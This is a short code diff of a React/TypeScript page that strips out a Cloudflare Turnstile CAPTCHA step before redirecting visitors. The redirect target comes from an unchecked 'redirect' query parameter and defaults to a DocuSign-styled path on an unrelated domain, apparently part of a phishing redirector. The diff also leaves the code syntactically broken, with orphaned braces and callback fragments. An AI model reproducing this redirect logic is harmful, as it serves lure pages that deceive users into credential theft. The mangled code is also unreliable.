@@ -8,20 +8,7 @@ function App() {
     const params = new URLSearchParams(window.location.search);
     const redirectUrl = params.get('redirect') || 'https://propitproject.net/#/d/docusign-project-new-670857c1';
 
-    // Wait for Turnstile script to load and render widget
-    const checkTurnstile = setInterval(() => {
-      if ((window as any).turnstile && turnstileRef.current) {
-        clearInterval(checkTurnstile);
-
-        // Clear any existing widget
-        turnstileRef.current.innerHTML = '';
-
-        // Render the Turnstile widget
-        (window as any).turnstile.render(turnstileRef.current, {
-          sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
-          theme: 'dark',
-          callback: (token: string) => {
-            // Redirect on successful verification
+                // Redirect on successful verification
             window.location.href = redirectUrl;
           },
         });
